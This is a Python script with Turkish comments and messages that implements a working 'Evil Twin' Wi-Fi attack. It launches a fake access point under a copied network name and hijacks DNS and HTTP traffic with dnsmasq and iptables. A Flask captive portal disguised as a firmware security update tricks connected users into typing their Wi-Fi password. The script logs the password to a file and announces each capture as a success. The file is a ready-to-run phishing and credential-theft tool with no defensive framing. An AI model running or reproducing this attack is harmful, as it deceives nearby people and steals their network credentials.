import os
import subprocess
import time
import threading

def cleanup():
    print("\n    [!] Arkaplan servisleri temizleniyor, ağ kalıntıları onarılıyor...")
    # DNS, DHCP ve Sahte AP servislerini öldür
    os.system("killall hostapd dnsmasq 2>/dev/null")
    os.system("rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf 2>/dev/null")
    
    # Iptables yönlendirmelerini (Captive Portal kalıntılarını) sıfırla
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
    os.system("iptables -F 2>/dev/null")
    os.system("iptables -t nat -F 2>/dev/null")
    
    # İnternet bağlantısını (NetworkManager) tam anlamıyla yeniden kur
    os.system("systemctl start NetworkManager 2>/dev/null")
    os.system("nmcli networking on 2>/dev/null")
    
    print("    [\033[92m✔\033[0m] Ağ kartınız ve internet bağlantınız orijinal haline getirildi.")

def launch_flask_portal(ssid):
    # Flask sunucusunu izole bir web servisi gibi başlatır
    portal_code = f"""
from flask import Flask, request, render_template_string, redirect
import os

app = Flask(__name__)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ ssid }} - Firmware Güncellemesi</title>
    <style>
        body {{ font-family: -apple-system, system-ui, sans-serif; background: #f4f6f8; margin: 0; padding: 20px; text-align: center; color: #333; }}
        .container {{ background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 50px auto; }}
        h2 {{ color: #d32f2f; }}
        input {{ width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }}
        button {{ background: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }}
        button:hover {{ background: #0056b3; }}
        .footer {{ margin-top: 20px; font-size: 12px; color: #777; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>Güvenlik Doğrulaması Gerekli</h2>
        <p>Modem bağlantınızı sağlamak için güvenlik güncellemesi yapılmıştır.</p>
        <p>Lütfen ağınızın (<b>{{ ssid }}</b>) mevcut Wi-Fi şifresini doğrulayın.</p>
        <form method="POST" action="/verify">
            <input type="password" name="password" placeholder="Wi-Fi Şifrenizi Girin" required minlength="8">
            <button type="submit">Doğrula ve Bağlan</button>
        </form>
        <div class="footer">© 2024 Ağ Yönetim Sistemi</div>
    </div>
</body>
</html>
'''

@app.route("/", defaults={{"path": ""}})
@app.route("/<path:path>")
def catch_all(path):
    # Apple/Android captive portal check
    user_agent = request.headers.get('User-Agent', '').lower()
    if 'captive' in user_agent or 'apple' in user_agent or 'safari' in user_agent:
        return render_template_string(HTML_TEMPLATE, ssid="{ssid}")
    
    # If not explicitly captured, redirect to portal page anyway
    if path != "portal":
        return redirect("/portal")
    return render_template_string(HTML_TEMPLATE, ssid="{ssid}")

@app.route("/verify", methods=["POST"])
def verify():
    pwd = request.form.get("password")
    if pwd:
        # Şifre bulundu!
        with open("/tmp/HACKED_CREDS.txt", "a") as f:
            f.write(f"SSID: {ssid} | PASSWORD: {{pwd}}\\n")
        print(f"\\n\\n[!!!] ŞİFRE YAKALANDI: {{pwd}}\\n")
        return "<h1>Bağlantı Başarılı.</h1><p>Şimdi internete bağlanabilirsiniz. Lütfen bu sayfayı kapatın.</p>"
    return "Hata"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=False)
"""
    with open("/tmp/flask_portal.py", "w") as f:
        f.write(portal_code)
    
    print("    [*] Captive Portal Web Sunucusu (Port 80) Başlatılıyor...")
    # Port 80 boşta mı kontrol et, çakışma varsa kapat
    os.system("fuser -k 80/tcp >/dev/null 2>&1")
    return subprocess.Popen(["python3", "/tmp/flask_portal.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_evil_twin(iface, ssid, channel):
    print(f"\n    [*] {ssid} için Şeytani İkiz (Evil Twin) hazırlanıyor...")
    
    # 1. Ortamı temizle
    cleanup()
    
    # 2. NetworkManager ve engelleyici servisleri kapat
    os.system("systemctl stop NetworkManager 2>/dev/null")
    os.system("killall wpa_supplicant 2>/dev/null")
    os.system("rfkill unblock wifi")
    time.sleep(1)
    
    # Ağ kartını sıfırla ve IP ataması yap
    os.system(f"ifconfig {iface} down")
    os.system(f"iwconfig {iface} mode managed 2>/dev/null")
    os.system(f"ifconfig {iface} 10.0.0.1 netmask 255.255.255.0 up")
    
    # 2.5 Iptables Yönlendirmeleri (Tüm trafiği port 80'e at)
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -F")
    os.system("iptables -t nat -F")
    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
    os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")
    
    # Kanal 14'ten büyükse (5GHz ağ ise) hostapd 'g' (2.4GHz) modunda çöker. 
    # Sahte ağ her zaman görünebilmesi için onu zorla Kanal 6'ya ayarlıyoruz.
    try:
        if int(channel) > 14:
            channel = "6"
    except:
        channel = "6"

    # 3. hostapd konfigürasyonu (Fake AP)
    hostapd_conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open("/tmp/hostapd.conf", "w") as f:
        f.write(hostapd_conf)

    # 4. dnsmasq konfigürasyonu (Captive portal DNS hijacking)
    dnsmasq_conf = f"""interface={iface}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
"""
    with open("/tmp/dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)
        
    print("    [*] Fake Erişim Noktası (AP) başlatılıyor...")
    ap_proc = subprocess.Popen(["hostapd", "/tmp/hostapd.conf"], stdout=open("/tmp/hostapd.log", "w"), stderr=subprocess.STDOUT)
    time.sleep(3)
    
    # Hostapd başlatılırken hata var mı yok mu detaylı yazdır
    color_yellow = '\033[93m'
    color_end = '\033[0m'
    print(f"\n    {color_yellow}[HOSTAPD BAŞLATMA LOGLARI]{color_end}")
    os.system("head -n 5 /tmp/hostapd.log | awk '{print \"        \" $0}'")
    print(f"    {color_yellow}{'-'*30}{color_end}\n")
    
    # Eğer hostapd hemen çöktüyse kullanıcıyı uyar
    if ap_proc.poll() is not None:
        print(f"\n    \033[91m[!] KRİTİK HATA: Sahte Wi-Fi ağı oluşturulamadı!\033[0m")
        print("    [*] Bunun en yaygın iki sebebi şunlardır:")
        print("        1. Wi-Fi adaptörünüz (veya sürücünüz) AP (Master) / Hotspot modunu desteklemiyor olabilir.")
        print("        2. Adaptör şu anda başka bir işlem tarafından kilitlenmiş olabilir.")
        print(f"\n    [Detaylı Hata Logu - /tmp/hostapd.log]:")
        os.system("cat /tmp/hostapd.log | grep -i error")
        cleanup()
        return
    
    print("    [*] DNS ve DHCP Yönlendirme Sunucusu başlatılıyor...")
    dns_proc = subprocess.Popen(["dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    
    # 5. Web Portalını Çalıştır
    flask_proc = launch_flask_portal(ssid)
    os.system("rm -f /tmp/HACKED_CREDS.txt") # Önceki logları sil
    
    print(f"\n    [\033[92m✔\033[0m] EVIL TWIN AKTİF!")
    print(f"    [*] Ağ Adı: {ssid} başlatıldı.")
    print(f"    [*] Lütfen telefonunuzun Wi-Fi listesini yenileyin, ağ görünecektir.")
    print(f"    [*] Cihazlar (Telefon/PC) tuzağa bağlandığında, Android/iOS otomatik portal pop-up çıkaracaktır.")
    print("    [*] Bekleniyor...")
    print("    [*] (Saldırıyı durdurmak için CTRL+C yapın)")
    
    try:
        while True:
            time.sleep(1)
            # Log dosyasında değişiklik varsa ana terminale bas
            if os.path.exists("/tmp/HACKED_CREDS.txt"):
                with open("/tmp/HACKED_CREDS.txt", "r") as f:
                    content = f.read()
                    print(f"\n\n\033[91m{'='*50}\033[0m")
                    print(f"\033[1m\033[92m[!!!] TEBRİKLER, ŞİFRE YAKALANDI!\033[0m")
                    print(f"\033[93m{content.strip()}\033[0m")
                    print(f"\033[91m{'='*50}\033[0m")
                os.system("rm -f /tmp/HACKED_CREDS.txt")
                
                # Başarılı olunca bir süre daha bekle ve çık
                print("\n    [*] Kurban sahte ağı terk edebilir. Çıkış yapılıyor...")
                time.sleep(3)
                break
                
    except KeyboardInterrupt:
        print("\n    [!] Saldırı Sonlandırılıyor...")
    finally:
        flask_proc.terminate()
        ap_proc.terminate()
        dns_proc.terminate()
        cleanup()
